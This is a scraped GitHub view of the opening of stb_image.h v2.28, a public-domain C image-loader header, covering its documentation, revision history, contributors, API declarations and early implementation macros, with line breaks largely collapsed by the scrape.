7987 lines (7103 loc) · 278 KB[Raw](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000/\* stb\_image - v2.28 - public domain image loader - http://nothings.org/stb no warranty implied; use at your own risk
 Do this: #define STB\_IMAGE\_IMPLEMENTATION before you include this file in \*one\* C or C++ file to create the implementation.
 // i.e. it should look like this: #include ... #include ... #include ... #define STB\_IMAGE\_IMPLEMENTATION #include "stb\_image.h"
 You can #define STBI\_ASSERT(x) before the #include to avoid using assert.h. And #define STBI\_MALLOC, STBI\_REALLOC, and STBI\_FREE to avoid using malloc,realloc,free
 QUICK NOTES: Primarily of interest to game developers and other people who can avoid problematic images and only need the trivial interface
 JPEG baseline & progressive (12 bpc/arithmetic not supported, same as stock IJG lib) PNG 1/2/4/8/16-bit-per-channel
 TGA (not sure what subset, if a subset) BMP non-1bpp, non-RLE PSD (composited view only, no extra channels, 8/16 bit-per-channel)
 GIF (\*comp always reports as 4-channel) HDR (radiance rgbE format) PIC (Softimage PIC) PNM (PPM and PGM binary only)
 Animated GIF still needs a proper API, but here's one way to do it: http://gist.github.com/urraka/685d9a6340b26b830d49
 - decode from memory or through FILE (define STBI\_NO\_STDIO to remove code) - decode from arbitrary I/O callbacks - SIMD acceleration on x86/x64 (SSE2) and ARM (NEON)
 Full documentation under "DOCUMENTATION" below.
LICENSE
 See end of file for license information.
RECENT REVISION HISTORY:
 2.28 (2023-01-29) many error fixes, security errors, just tons of stuff 2.27 (2021-07-11) document stbi\_info better, 16-bit PNM support, bug fixes 2.26 (2020-07-13) many minor fixes 2.25 (2020-02-02) fix warnings 2.24 (2020-02-02) fix warnings; thread-local failure\_reason and flip\_vertically 2.23 (2019-08-11) fix clang static analysis warning 2.22 (2019-03-04) gif fixes, fix warnings 2.21 (2019-02-25) fix typo in comment 2.20 (2019-02-07) support utf8 filenames in Windows; fix warnings and platform ifdefs 2.19 (2018-02-11) fix warning 2.18 (2018-01-30) fix warnings 2.17 (2018-01-29) bugfix, 1-bit BMP, 16-bitness query, fix warnings 2.16 (2017-07-23) all functions have 16-bit variants; optimizations; bugfixes 2.15 (2017-03-18) fix png-1,2,4; all Imagenet JPGs; no runtime SSE detection on GCC 2.14 (2017-03-03) remove deprecated STBI\_JPEG\_OLD; fixes for Imagenet JPGs 2.13 (2016-12-04) experimental 16-bit API, only for PNG so far; fixes 2.12 (2016-04-02) fix typo in 2.11 PSD fix that caused crashes 2.11 (2016-04-02) 16-bit PNGS; enable SSE2 in non-gcc x64 RGB-format JPEG; remove white matting in PSD; allocate large structures on the stack; correct channel count for PNG & BMP 2.10 (2016-01-22) avoid warning introduced in 2.09 2.09 (2016-01-16) 16-bit TGA; comments in PNM files; STBI\_REALLOC\_SIZED
 See end of file for full revision history.
 ============================ Contributors =========================
 Image formats Extensions, features Sean Barrett (jpeg, png, bmp) Jetro Lauha (stbi\_info) Nicolas Schulz (hdr, psd) Martin "SpartanJ" Golini (stbi\_info) Jonathan Dummer (tga) James "moose2000" Brown (iPhone PNG) Jean-Marc Lienher (gif) Ben "Disch" Wenger (io callbacks) Tom Seddon (pic) Omar Cornut (1/2/4-bit PNG) Thatcher Ulrich (psd) Nicolas Guillemot (vertical flip) Ken Miller (pgm, ppm) Richard Mitton (16-bit PSD) github:urraka (animated gif) Junggon Kim (PNM comments) Christopher Forseth (animated gif) Daniel Gibson (16-bit TGA) socks-the-fox (16-bit PNG) Jeremy Sawicki (handle all ImageNet JPGs) Optimizations & bugfixes Mikhail Morozov (1-bit BMP) Fabian "ryg" Giesen Anael Seghezzi (is-16-bit query) Arseny Kapoulkine Simon Breuss (16-bit PNM) John-Mark Allen Carmelo J Fdez-Aguera
 Bug & warning fixes Marc LeBlanc David Woo Guillaume George Martins Mozeiko Christpher Lloyd Jerry Jansson Joseph Thomson Blazej Dariusz Roszkowski Phil Jordan Dave Moore Roy Eltham Hayaki Saito Nathan Reed Won Chun Luke Graham Johan Duparc Nick Verigakis the Horde3D community Thomas Ruf Ronny Chevalier github:rlyeh Janez Zemva John Bartholomew Michal Cichon github:romigrou Jonathan Blow Ken Hamada Tero Hanninen github:svdijk Eugene Golushkov Laurent Gomila Cort Stratton github:snagar Aruelien Pocheville Sergio Gonzalez Thibault Reuille github:Zelex Cass Everitt Ryamond Barbiero github:grim210 Paul Du Bois Engin Manap Aldo Culquicondor github:sammyhw Philipp Wiesemann Dale Weiler Oriol Ferrer Mesia github:phprus Josh Tobin Neil Bickford Matthew Gregan github:poppolopoppo Julian Raschke Gregory Mullen Christian Floisand github:darealshinji Baldur Karlsson Kevin Schmidt JR Smith github:Michaelangel007 Brad Weinberger Matvey Cherevko github:mosra Luca Sas Alexander Veselov Zack Middleton [reserved] Ryan C. Gordon [reserved] [reserved] DO NOT ADD YOUR NAME HERE
 Jacko Dirks
 To add your name to the credits, pick a random blank space in the middle and fill it. 80% of merge conflicts on stb PRs are due to people adding their name at the end of the credits.\*/
#ifndef STBI\_INCLUDE\_STB\_IMAGE\_H#define STBI\_INCLUDE\_STB\_IMAGE\_H
// DOCUMENTATION//// Limitations:// - no 12-bit-per-channel JPEG// - no JPEGs with arithmetic coding// - GIF always returns \*comp=4//// Basic usage (see HDR discussion below for HDR usage):// int x,y,n;// unsigned char \*data = stbi\_load(filename, &x, &y, &n, 0);// // ... process data if not NULL ...// // ... x = width, y = height, n = # 8-bit components per pixel ...// // ... replace '0' with '1'..'4' to force that many components per pixel// // ... but 'n' will always be the number that it would have been if you said 0// stbi\_image\_free(data);//// Standard parameters:// int \*x -- outputs image width in pixels// int \*y -- outputs image height in pixels// int \*channels\_in\_file -- outputs # of image components in image file// int desired\_channels -- if non-zero, # of image components requested in result//// The return value from an image loader is an 'unsigned char \*' which points// to the pixel data, or NULL on an allocation failure or if the image is// corrupt or invalid. The pixel data consists of \*y scanlines of \*x pixels,// with each pixel consisting of N interleaved 8-bit components; the first// pixel pointed to is top-left-most in the image. There is no padding between// image scanlines or between pixels, regardless of format. The number of// components N is 'desired\_channels' if desired\_channels is non-zero, or// \*channels\_in\_file otherwise. If desired\_channels is non-zero,// \*channels\_in\_file has the number of components that \_would\_ have been// output otherwise. E.g. if you set desired\_channels to 4, you will always// get RGBA output, but you can check \*channels\_in\_file to see if it's trivially// opaque because e.g. there were only 3 channels in the source image.//// An output image with N components has the following components interleaved// in this order in each pixel://// N=#comp components// 1 grey// 2 grey, alpha// 3 red, green, blue// 4 red, green, blue, alpha//// If image loading fails for any reason, the return value will be NULL,// and \*x, \*y, \*channels\_in\_file will be unchanged. The function// stbi\_failure\_reason() can be queried for an extremely brief, end-user// unfriendly explanation of why the load failed. Define STBI\_NO\_FAILURE\_STRINGS// to avoid compiling these strings at all, and STBI\_FAILURE\_USERMSG to get slightly// more user-friendly ones.//// Paletted PNG, BMP, GIF, and PIC images are automatically depalettized.//// To query the width, height and component count of an image without having to// decode the full file, you can use the stbi\_info family of functions://// int x,y,n,ok;// ok = stbi\_info(filename, &x, &y, &n);// // returns ok=1 and sets x, y, n if image is a supported format,// // 0 otherwise.//// Note that stb\_image pervasively uses ints in its public API for sizes,// including sizes of memory buffers. This is now part of the API and thus// hard to change without causing breakage. As a result, the various image// loaders all have certain limits on image size; these differ somewhat// by format but generally boil down to either just under 2GB or just under// 1GB. When the decoded image would be larger than this, stb\_image decoding// will fail.//// Additionally, stb\_image will reject image files that have any of their// dimensions set to a larger value than the configurable STBI\_MAX\_DIMENSIONS,// which defaults to 2\*\*24 = 16777216 pixels. Due to the above memory limit,// the only way to have an image with such dimensions load correctly// is for it to have a rather extreme aspect ratio. Either way, the// assumption here is that such larger images are likely to be malformed// or malicious. If you do need to load an image with individual dimensions// larger than that, and it still fits in the overall size limit, you can// #define STBI\_MAX\_DIMENSIONS on your own to be something larger.//// ===========================================================================//// UNICODE://// If compiling for Windows and you wish to use Unicode filenames, compile// with// #define STBI\_WINDOWS\_UTF8// and pass utf8-encoded filenames. Call stbi\_convert\_wchar\_to\_utf8 to convert// Windows wchar\_t filenames to utf8.//// ===========================================================================//// Philosophy//// stb libraries are designed with the following priorities://// 1. easy to use// 2. easy to maintain// 3. good performance//// Sometimes I let "good performance" creep up in priority over "easy to maintain",// and for best performance I may provide less-easy-to-use APIs that give higher// performance, in addition to the easy-to-use ones. Nevertheless, it's important// to keep in mind that from the standpoint of you, a client of this library,// all you care about is #1 and #3, and stb libraries DO NOT emphasize #3 above all.//// Some secondary priorities arise directly from the first two, some of which// provide more explicit reasons why performance can't be emphasized.//// - Portable ("ease of use")// - Small source code footprint ("easy to maintain")// - No dependencies ("ease of use")//// ===========================================================================//// I/O callbacks//// I/O callbacks allow you to read from arbitrary sources, like packaged// files or some other source. Data read from callbacks are processed// through a small internal buffer (currently 128 bytes) to try to reduce// overhead.//// The three functions you must define are "read" (reads some bytes of data),// "skip" (skips some bytes of data), "eof" (reports if the stream is at the end).//// ===========================================================================//// SIMD support//// The JPEG decoder will try to automatically use SIMD kernels on x86 when// supported by the compiler. For ARM Neon support, you must explicitly// request it.//// (The old do-it-yourself SIMD API is no longer supported in the current// code.)//// On x86, SSE2 will automatically be used when available based on a run-time// test; if not, the generic C versions are used as a fall-back. On ARM targets,// the typical path is to have separate builds for NEON and non-NEON devices// (at least this is true for iOS and Android). Therefore, the NEON support is// toggled by a build flag: define STBI\_NEON to get NEON loops.//// If for some reason you do not want to use any of SIMD code, or if// you have issues compiling it, you can disable it entirely by// defining STBI\_NO\_SIMD.//// ===========================================================================//// HDR image support (disable by defining STBI\_NO\_HDR)//// stb\_image supports loading HDR images in general, and currently the Radiance// .HDR file format specifically. You can still load any file through the existing// interface; if you attempt to load an HDR file, it will be automatically remapped// to LDR, assuming gamma 2.2 and an arbitrary scale factor defaulting to 1;// both of these constants can be reconfigured through this interface://// stbi\_hdr\_to\_ldr\_gamma(2.2f);// stbi\_hdr\_to\_ldr\_scale(1.0f);//// (note, do not use \_inverse\_ constants; stbi\_image will invert them// appropriately).//// Additionally, there is a new, parallel interface for loading files as// (linear) floats to preserve the full dynamic range://// float \*data = stbi\_loadf(filename, &x, &y, &n, 0);//// If you load LDR images through this interface, those images will// be promoted to floating point values, run through the inverse of// constants corresponding to the above://// stbi\_ldr\_to\_hdr\_scale(1.0f);// stbi\_ldr\_to\_hdr\_gamma(2.2f);//// Finally, given a filename (or an open file or memory block--see header// file for details) containing image data, you can query for the "most// appropriate" interface to use (that is, whether the image is HDR or// not), using://// stbi\_is\_hdr(char \*filename);//// ===========================================================================//// iPhone PNG support://// We optionally support converting iPhone-formatted PNGs (which store// premultiplied BGRA) back to RGB, even though they're internally encoded// differently. To enable this conversion, call// stbi\_convert\_iphone\_png\_to\_rgb(1).//// Call stbi\_set\_unpremultiply\_on\_load(1) as well to force a divide per// pixel to remove any premultiplied alpha \*only\* if the image file explicitly// says there's premultiplied data (currently only happens in iPhone images,// and only if iPhone convert-to-rgb processing is on).//// ===========================================================================//// ADDITIONAL CONFIGURATION//// - You can suppress implementation of any of the decoders to reduce// your code footprint by #defining one or more of the following// symbols before creating the implementation.//// STBI\_NO\_JPEG// STBI\_NO\_PNG// STBI\_NO\_BMP// STBI\_NO\_PSD// STBI\_NO\_TGA// STBI\_NO\_GIF// STBI\_NO\_HDR// STBI\_NO\_PIC// STBI\_NO\_PNM (.ppm and .pgm)//// - You can request \*only\* certain decoders and suppress all other ones// (this will be more forward-compatible, as addition of new decoders// doesn't require you to disable them explicitly)://// STBI\_ONLY\_JPEG// STBI\_ONLY\_PNG// STBI\_ONLY\_BMP// STBI\_ONLY\_PSD// STBI\_ONLY\_TGA// STBI\_ONLY\_GIF// STBI\_ONLY\_HDR// STBI\_ONLY\_PIC// STBI\_ONLY\_PNM (.ppm and .pgm)//// - If you use STBI\_NO\_PNG (or \_ONLY\_ without PNG), and you still// want the zlib decoder to be available, #define STBI\_SUPPORT\_ZLIB//// - If you define STBI\_MAX\_DIMENSIONS, stb\_image will reject images greater// than that size (in either width or height) without further processing.// This is to let programs in the wild set an upper bound to prevent// denial-of-service attacks on untrusted data, as one could generate a// valid image of gigantic dimensions and force stb\_image to allocate a// huge block of memory and spend disproportionate time decoding it. By// default this is set to (1 << 24), which is 16777216, but that's still// very big.
#ifndef STBI\_NO\_STDIO#include <stdio.h>#endif // STBI\_NO\_STDIO
#define STBI\_VERSION 1
enum{ STBI\_default = 0, // only used for desired\_channels
 STBI\_grey = 1, STBI\_grey\_alpha = 2, STBI\_rgb = 3, STBI\_rgb\_alpha = 4};
#include <stdlib.h>typedef unsigned char stbi\_uc;typedef unsigned short stbi\_us;
#ifdef \_\_cplusplusextern "C" {#endif
#ifndef STBIDEF#ifdef STB\_IMAGE\_STATIC#define STBIDEF static#else#define STBIDEF extern#endif#endif
////////////////////////////////////////////////////////////////////////////////// PRIMARY API - works on images of any type//
//// load image by filename, open file, or memory buffer//
typedef struct{ int (\*read) (void \*user,char \*data,int size); // fill 'data' with 'size' bytes. return number of bytes actually read void (\*skip) (void \*user,int n); // skip the next 'n' bytes, or 'unget' the last -n bytes if negative int (\*eof) (void \*user); // returns nonzero if we are at end of file/data} stbi\_io\_callbacks;
//////////////////////////////////////// 8-bits-per-channel interface//
STBIDEF stbi\_uc \*stbi\_load\_from\_memory (stbi\_uc const \*buffer, int len , int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_uc \*stbi\_load\_from\_callbacks(stbi\_io\_callbacks const \*clbk , void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
#ifndef STBI\_NO\_STDIOSTBIDEF stbi\_uc \*stbi\_load (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_uc \*stbi\_load\_from\_file (FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);// for stbi\_load\_from\_file, file pointer is left pointing immediately after image#endif
#ifndef STBI\_NO\_GIFSTBIDEF stbi\_uc \*stbi\_load\_gif\_from\_memory(stbi\_uc const \*buffer, int len, int \*\*delays, int \*x, int \*y, int \*z, int \*comp, int req\_comp);#endif
#ifdef STBI\_WINDOWS\_UTF8STBIDEF int stbi\_convert\_wchar\_to\_utf8(char \*buffer, size\_t bufferlen, const wchar\_t\* input);#endif
//////////////////////////////////////// 16-bits-per-channel interface//
STBIDEF stbi\_us \*stbi\_load\_16\_from\_memory (stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_us \*stbi\_load\_16\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
#ifndef STBI\_NO\_STDIOSTBIDEF stbi\_us \*stbi\_load\_16 (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);STBIDEF stbi\_us \*stbi\_load\_from\_file\_16(FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);#endif
//////////////////////////////////////// float-per-channel interface//#ifndef STBI\_NO\_LINEAR STBIDEF float \*stbi\_loadf\_from\_memory (stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); STBIDEF float \*stbi\_loadf\_from\_callbacks (stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels);
 #ifndef STBI\_NO\_STDIO STBIDEF float \*stbi\_loadf (char const \*filename, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); STBIDEF float \*stbi\_loadf\_from\_file (FILE \*f, int \*x, int \*y, int \*channels\_in\_file, int desired\_channels); #endif#endif
#ifndef STBI\_NO\_HDR STBIDEF void stbi\_hdr\_to\_ldr\_gamma(float gamma); STBIDEF void stbi\_hdr\_to\_ldr\_scale(float scale);#endif // STBI\_NO\_HDR
#ifndef STBI\_NO\_LINEAR STBIDEF void stbi\_ldr\_to\_hdr\_gamma(float gamma); STBIDEF void stbi\_ldr\_to\_hdr\_scale(float scale);#endif // STBI\_NO\_LINEAR
// stbi\_is\_hdr is always defined, but always returns false if STBI\_NO\_HDRSTBIDEF int stbi\_is\_hdr\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user);STBIDEF int stbi\_is\_hdr\_from\_memory(stbi\_uc const \*buffer, int len);#ifndef STBI\_NO\_STDIOSTBIDEF int stbi\_is\_hdr (char const \*filename);STBIDEF int stbi\_is\_hdr\_from\_file(FILE \*f);#endif // STBI\_NO\_STDIO
// get a VERY brief reason for failure// on most compilers (and ALL modern mainstream compilers) this is threadsafeSTBIDEF const char \*stbi\_failure\_reason (void);
// free the loaded image -- this is just free()STBIDEF void stbi\_image\_free (void \*retval\_from\_stbi\_load);
// get image dimensions & components without fully decodingSTBIDEF int stbi\_info\_from\_memory(stbi\_uc const \*buffer, int len, int \*x, int \*y, int \*comp);STBIDEF int stbi\_info\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user, int \*x, int \*y, int \*comp);STBIDEF int stbi\_is\_16\_bit\_from\_memory(stbi\_uc const \*buffer, int len);STBIDEF int stbi\_is\_16\_bit\_from\_callbacks(stbi\_io\_callbacks const \*clbk, void \*user);
#ifndef STBI\_NO\_STDIOSTBIDEF int stbi\_info (char const \*filename, int \*x, int \*y, int \*comp);STBIDEF int stbi\_info\_from\_file (FILE \*f, int \*x, int \*y, int \*comp);STBIDEF int stbi\_is\_16\_bit (char const \*filename);STBIDEF int stbi\_is\_16\_bit\_from\_file(FILE \*f);#endif
// for image formats that explicitly notate that they have premultiplied alpha,// we just return the colors as stored in the file. set this flag to force// unpremultiplication. results are undefined if the unpremultiply overflow.STBIDEF void stbi\_set\_unpremultiply\_on\_load(int flag\_true\_if\_should\_unpremultiply);
// indicate whether we should process iphone images back to canonical format,// or just pass them through "as-is"STBIDEF void stbi\_convert\_iphone\_png\_to\_rgb(int flag\_true\_if\_should\_convert);
// flip the image vertically, so the first pixel in the output array is the bottom leftSTBIDEF void stbi\_set\_flip\_vertically\_on\_load(int flag\_true\_if\_should\_flip);
// as above, but only applies to images loaded on the thread that calls the function// this function is only available if your compiler supports thread-local variables;// calling it will fail to link if your compiler doesn'tSTBIDEF void stbi\_set\_unpremultiply\_on\_load\_thread(int flag\_true\_if\_should\_unpremultiply);STBIDEF void stbi\_convert\_iphone\_png\_to\_rgb\_thread(int flag\_true\_if\_should\_convert);STBIDEF void stbi\_set\_flip\_vertically\_on\_load\_thread(int flag\_true\_if\_should\_flip);
// ZLIB client - used by PNG, available for other purposes
STBIDEF char \*stbi\_zlib\_decode\_malloc\_guesssize(const char \*buffer, int len, int initial\_size, int \*outlen);STBIDEF char \*stbi\_zlib\_decode\_malloc\_guesssize\_headerflag(const char \*buffer, int len, int initial\_size, int \*outlen, int parse\_header);STBIDEF char \*stbi\_zlib\_decode\_malloc(const char \*buffer, int len, int \*outlen);STBIDEF int stbi\_zlib\_decode\_buffer(char \*obuffer, int olen, const char \*ibuffer, int ilen);
STBIDEF char \*stbi\_zlib\_decode\_noheader\_malloc(const char \*buffer, int len, int \*outlen);STBIDEF int stbi\_zlib\_decode\_noheader\_buffer(char \*obuffer, int olen, const char \*ibuffer, int ilen);
#ifdef \_\_cplusplus}#endif
//////// end header file /////////////////////////////////////////////////////#endif // STBI\_INCLUDE\_STB\_IMAGE\_H
#ifdef STB\_IMAGE\_IMPLEMENTATION
#if defined(STBI\_ONLY\_JPEG) || defined(STBI\_ONLY\_PNG) || defined(STBI\_ONLY\_BMP) \ || defined(STBI\_ONLY\_TGA) || defined(STBI\_ONLY\_GIF) || defined(STBI\_ONLY\_PSD) \ || defined(STBI\_ONLY\_HDR) || defined(STBI\_ONLY\_PIC) || defined(STBI\_ONLY\_PNM) \ || defined(STBI\_ONLY\_ZLIB) #ifndef STBI\_ONLY\_JPEG #define STBI\_NO\_JPEG #endif #ifndef STBI\_ONLY\_PNG #define STBI\_NO\_PNG #endif #ifndef STBI\_ONLY\_BMP #define STBI\_NO\_BMP #endif #ifndef STBI\_ONLY\_PSD #define STBI\_NO\_PSD #endif #ifndef STBI\_ONLY\_TGA #define STBI\_NO\_TGA #endif #ifndef STBI\_ONLY\_GIF #define STBI\_NO\_GIF #endif #ifndef STBI\_ONLY\_HDR #define STBI\_NO\_HDR #endif #ifndef STBI\_ONLY\_PIC #define STBI\_NO\_PIC #endif #ifndef STBI\_ONLY\_PNM #define STBI\_NO\_PNM #endif#endif
#if defined(STBI\_NO\_PNG) && !defined(STBI\_SUPPORT\_ZLIB) && !defined(STBI\_NO\_ZLIB)#define STBI\_NO\_ZLIB#endif
#include <stdarg.h>#include <stddef.h> // ptrdiff\_t on osx#include <stdlib.h>#include <string.h>#include <limits.h>
#if !defined(STBI\_NO\_LINEAR) || !defined(STBI\_NO\_HDR)#include <math.h> // ldexp, pow#endif
#ifndef STBI\_NO\_STDIO#include <stdio.h>#endif
#ifndef STBI\_ASSERT#include <assert.h>#define STBI\_ASSERT(x) assert(x)#endif
#ifdef \_\_cplusplus#define STBI\_EXTERN extern "C"#else#define STBI\_EXTERN extern#endif
#ifndef \_MSC\_VER #ifdef \_\_cplusplus #define stbi\_inline inline #else #define stbi\_inline #endif#else #define stbi\_inline \_\_forceinline#endif
#ifndef STBI\_NO\_THREAD\_LOCALS #if defined(\_\_cplusplus) && \_\_cplusplus >= 201103L #define STBI\_THREAD\_LOCAL thread\_local #elif defined(\_\_GNUC\_\_) && \_\_GNUC\_\_ < 5 #define STBI\_THREAD\_LOCAL \_\_thread #elif defined(\_MSC\_VER) #define STBI\_THREAD\_LOCAL \_\_declspec(thread) #elif defined (\_\_STDC\_VERSION\_\_) && \_\_STDC\_VERSION\_\_ >= 201112L && !defined(\_\_STDC\_NO\_THREADS\_\_) #define STBI\_THREAD\_LOCAL \_Thread\_local #endif
 #ifndef STBI\_THREAD\_LOCAL #if defined(\_\_GNUC\_\_) #define STBI\_THREAD\_LOCAL \_\_thread #endif #endif#endif
#if defined(\_MSC\_VER) || defined(\_\_SYMBIAN32\_\_)typedef unsigned short stbi\_\_uint16;typedef signed short stbi\_\_int16;typedef unsigned int stbi\_\_uint32;typedef signed int stbi\_\_int32;#else#include <stdint.h>typedef uint16\_t stbi\_\_uint16;typedef int16\_t stbi\_\_int16;typedef uint32\_t stbi\_\_uint32;typedef int32\_t stbi\_\_int32;#endif
// should produce compiler error if size is wrongtypedef unsigned char validate\_uint32[sizeof(stbi\_\_uint32)==4 ? 1 : -1];
#ifdef \_MSC\_VER#define STBI\_NOTUSED(v) (void)(v)#else#define STBI\_NOTUSED(v) (void)sizeof(v)#endif
#ifdef \_MSC\_VER#define STBI\_HAS\_LROTL#endif
#ifdef STBI\_HAS\_LROTL #define stbi\_lrot(x,y) \_lrotl(x,y)#else #define stbi\_lrot(x,y) (((x) << (y)) | ((x) >> (-(y) & 31)))#endif
#if defined(STBI\_MALLOC) && defined(STBI\_FREE) && (defined(STBI\_REALLOC) || defined(STBI\_REALLOC\_SIZED))// ok#elif !defined(STBI\_MALLOC) && !defined(STBI\_FREE) && !defined(STBI\_REALLOC) && !defined(STBI\_REALLOC\_SIZED)// ok#else#error "Must define all or none of STBI\_MALLOC, STBI\_FREE, and STBI\_REALLOC (or STBI\_REALLOC\_SIZED)."#endif
#ifndef STBI\_MALLOC#define STBI\_MALLOC(sz) malloc(sz)#define STBI\_REALLOC(p,newsz) realloc(p,newsz)#define STBI\_FREE(p) free(p)#endif
#ifndef STBI\_REALLOC\_SIZED#define STBI\_REALLOC\_SIZED(p,oldsz,newsz) STBI\_REALLOC(p,newsz)#endif
// x86/x64 detection#if defined(\_\_x86\_64\_\_) || defined(\_M\_X64)#define STBI\_\_X64\_TARGET#elif defined(\_\_i386) || defined(\_M\_IX86)#define STBI\_\_X86\_TARGET#endif
#if defined(\_\_GNUC\_\_) && defined(STBI\_\_X86\_TARGET) && !defined(\_\_SSE2\_\_) && !defined(STBI\_NO\_SIMD)// gcc doesn't support sse2 intrinsics unless you compile with -msse2,// which in turn means it gets to use SSE2 everywhere. This is unfortunate,// but previous attempts to provide the SSE2 functions with runtime// detection caused numerous issues. The way architecture extensions are// exposed in GCC/Clang is, sadly, not really suited for one-file libs.// New behavior: if compiled with -msse2, we use SSE2 without any// detection; if not, we don't use it at all.#define STBI\_NO\_SIMD#endif
#if defined(\_\_MINGW32\_\_) && defined(STBI\_\_X86\_TARGET) && !defined(STBI\_MINGW\_ENABLE\_SSE2) && !defined(STBI\_NO\_SIMD)// Note that \_\_MINGW32\_\_ doesn't actually mean 32-bit, so we have to avoid STBI\_\_X64\_TARGET//// 32-bit MinGW wants ESP to be 16-byte aligned, but this is not in the// Windows ABI and VC++ as well as Windows DLLs don't maintain that invariant.// As a result, enabling SSE2 on 32-bit MinGW is dangerous when not// simultaneously enabling "-mstackrealign".//// See https://github.com/nothings/stb/issues/81 for more information.//// So default to no SSE2 on 32-bit MinGW. If you've read this far and added// -mstackrealign to your build settings, feel free to #define STBI\_MINGW\_ENABLE\_SSE2.#define STBI\_NO\_SIMD#endif
#if !defined(STBI\_NO\_SIMD) && (defined(STBI\_\_X86\_TARGET) || defined(STBI\_\_X64\_TARGET))#define STBI\_SSE2#include <emmintrin.h>
#ifdef \_MSC\_VER
#if \_MSC\_VER >= 1400 // not VC6#include <intrin.h> // \_\_cpuidstatic int stbi\_\_cpuid3(void){ int info[4]; \_\_cpuid(info,1); return info[3];}#elsestatic int stbi\_\_cpuid3(void){ int res; \_\_asm { mov eax,1 cpuid mov res,edx } return res;}#endif
#define STBI\_SIMD\_ALIGN(type, name) \_\_declspec(align(16)) type name
#if !defined(STBI\_NO\_JPEG) && defined(STBI\_SSE2)static int stbi\_\_sse2\_available(void){ int info3 = stbi\_\_cpuid3(); return ((info3 >> 26) & 1) != 0;}#endif
#else // assume GCC-style if not VC++#define STBI\_SIMD\_ALIGN(type, name) type name \_\_attribute\_\_((aligned(16)))
#if !defined(STBI\_NO\_JPEG) && defined(STBI\_SSE2)static int stbi\_\_sse2\_available(void){ // If we're even attempting to compile this on GCC/Clang, that means // -msse2 is on, which means the compiler is allowed to use SSE2 // instructions at will, and so are we. return 1;}#endif
#endif#endif
// ARM NEON#if defined(STBI\_NO\_SIMD) && defined(STBI\_NEON)#undef STBI\_NEON#endif
#ifdef STBI\_NEON#include <arm\_neon.h>#ifdef \_MSC\_VER#define STBI\_SIMD\_ALIGN(type, name) \_\_declspec(align(16)) type name#else#define STBI\_SIMD\_ALIGN(type, name) type name \_\_attribute\_\_((aligned(16)))#endif#endif
#ifndef STBI\_SIMD\_ALIGN#define STBI\_SIMD\_ALIGN(type, name) type name#endif
#ifndef STBI\_MAX\_DIMENSIONS#define STBI\_MAX\_DIMENSIONS (1 << 24)#endif
/////////////////////////////////////////////////// stbi\_\_context struct and start\_xxx functions
// stbi\_\_context structure is our basic context used by all images, so it// contains all the IO context, plus some basic image informationtypedef struct{ stbi\_\_uint32 img\_x, img\_y; int img\_n, img\_out\_n;
 stbi\_io\_callbacks io; void \*io\_user\_data;
 int read\_from\_callbacks; int buflen; stbi\_uc buffer\_start[128]; int callback\_already\_read;
 stbi\_uc \*img\_buffer, \*img\_buffer\_end; stbi\_uc \*img\_buffer\_original, \*img\_buffer\_original\_end;} stbi\_\_context;
static void stbi\_\_refill\_buffer(stbi\_\_context \*s);
// initialize a memory-decode contextstatic void stbi\_\_start\_mem(stbi\_\_context \*s, stbi\_uc const \*buffer, int len){ s->io.read = NULL; s->read\_from\_callbacks = 0; s->callback\_already\_read = 0; s->img\_buffer = s->img\_buffer\_original = (stbi\_uc \*) buffer; s->img\_buffer\_end = s->img\_buffer\_original\_end = (stbi\_uc \*) buffer+len;}
